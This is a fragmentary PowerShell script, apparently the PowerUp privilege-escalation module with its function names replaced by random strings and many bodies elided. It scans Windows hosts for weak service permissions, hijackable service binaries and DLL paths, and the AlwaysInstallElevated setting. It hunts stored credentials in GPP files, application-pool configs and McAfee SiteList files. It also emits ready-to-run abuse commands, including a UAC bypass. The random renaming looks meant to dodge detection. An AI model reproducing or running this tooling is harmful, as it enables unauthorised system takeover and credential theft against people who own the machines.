...
function JTDOS6Q7 {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenGroups = HINBKA0W -TokenHandle $hProcToken -InformationClass 'Groups'
...
function QCXLYDMX {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                HINBKA0W -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
...
function 1F6E5ES7 {
    ...
    PROCESS {
        ...
        if ($ProcessHandle) {
            ...
            if ($Success) {
                $TokenType = HINBKA0W -TokenHandle $hProcToken -InformationClass 'Type'
...
function SCRG80YJ {
    ...
    PROCESS {
        ForEach($ServiceName in $Name) {
            ...
            try {
                Write-Verbose "SCRG80YJ IndividualService : $($IndividualService.Name)"
...
function 0RYJV26Z {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = $IndividualService | SCRG80YJ
...
function 6YN74LBL {
    ...
    if ($VulnServices) {
        ForEach ($Service in $VulnServices) {
            ...
            $ModifiableFiles = $ConcatPathArray | D5USFBMX

            $ModifiableFiles | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
                $CanRestart = 0RYJV26Z -PermissionSet 'Restart' -Name $Service.name
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceName' $Service.name
                $Out | Add-Member Noteproperty 'Path' $Service.pathname
                $Out | Add-Member Noteproperty 'ModifiablePath' $_
                $Out | Add-Member Noteproperty 'StartName' $Service.startname
                $Out | Add-Member Noteproperty 'AbuseFunction' "9ME8TDBW -Name '$($Service.name)' -Path <HijackPath>"
...
function Q1M8F501 {
    ...
    Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
        ...
        $ServicePath | D5USFBMX | ForEach-Object {
            $CanRestart = 0RYJV26Z -PermissionSet 'Restart' -Name $ServiceName
            $Out = New-Object PSObject
            ...
            $Out | Add-Member Noteproperty 'AbuseFunction' "344J93XW -Name '$ServiceName'"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
...
function 58NT5S5H {
    ...
    Get-Service | 0RYJV26Z -PermissionSet 'ChangeConfig' | ForEach-Object {
        $ServiceDetails = $_ | VPU2EW5J
        $CanRestart = $_ | 0RYJV26Z -PermissionSet 'Restart'
        $Out = New-Object PSObject
        ...
        $Out | Add-Member Noteproperty 'AbuseFunction' "N9T123WL -Name '$($ServiceDetails.name)'"
        $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
        $Out | Add-Member Aliasproperty Name ServiceName
...
function N9T123WL {
    ...
    PROCESS {
        ...
        ForEach($IndividualService in $Name) {
            ...
            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
            $ServiceDetails = $TargetService | VPU2EW5J
            ...
            ForEach($ServiceCommand in $ServiceCommands) {
                ...
                $Success = $TargetService | 2653GGW5 -Path "$ServiceCommand"
            ...
            $Success = $TargetService | 2653GGW5 -Path "$OriginalServicePath"
...
function 344J93XW {
    ...
    PROCESS {
        ...
        $ServiceDetails = $TargetService | VPU2EW5J
        $ModifiableFiles = $ServiceDetails.PathName | D5USFBMX -Literal
        ...
        $Result = 9ME8TDBW -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
...
function Y1ZSQ628 {
    ...
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | D5USFBMX -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
    ...
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            ...
            if ($TaskXML.Task.Triggers) {
                ...
                $TaskXML.Task.Actions.Exec.Command | D5USFBMX | ForEach-Object {
                    $Out = New-Object PSObject
                ...
                $TaskXML.Task.Actions.Exec.Arguments | D5USFBMX | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
...
function UY1NP651 {
    ...
    Write-Verbose "Running UY1NP651"
    ...
    $Checks = @(
        ...
        @{
            ...
            Command     = { if ((JTDOS6Q7 | Select-Object -ExpandProperty SID) -contains 'S-1-5-32-544'){ New-Object PSObject } }
            AbuseScript = { 'Invoke-WScriptUACBypass -Command "..."' }
        },
        @{
            Type       = 'Process Token Privileges'
            Command    = { QCXLYDMX -Special | Where-Object {$_} }
        },
        ...
        @{
            ...
            Command     = { Y1ZSQ628 }
            AbuseScript = { "92VBBAPH -DllPath '$($_.ModifiablePath)\wlbsctrl.dll'" }
        },
        
        @{
            Type        = 'AlwaysInstallElevated Registry Key'
            Command     = { if (RWE3SECR){ New-Object PSObject } }
            AbuseScript = { 'QA0LZF6E' }
        },
        @{
        ...
        @{
            ...
            Command = { 5H3Z7XL9 | Where-Object {$_} }
        },
        @{
            Type    = 'Encrypted Application Pool Passwords'
            Command = { V2U5RZIX | Where-Object {$_} }
        },
        @{
            Type    = 'McAfee SiteList.xml files'
            Command = { SN242LC9 | Where-Object {$_} }
        },
        @{
            Type    = 'Cached GPP Files'
            Command = { 5T5DB12P | Where-Object {$_} }
        }
    )
...
$Module = 4EKRXRSP -ModuleName PowerUpModule
...
Set-Alias Get-CurrentUserTokenGroupSid JTDOS6Q7
Set-Alias Invoke-AllChecks UY1NP651
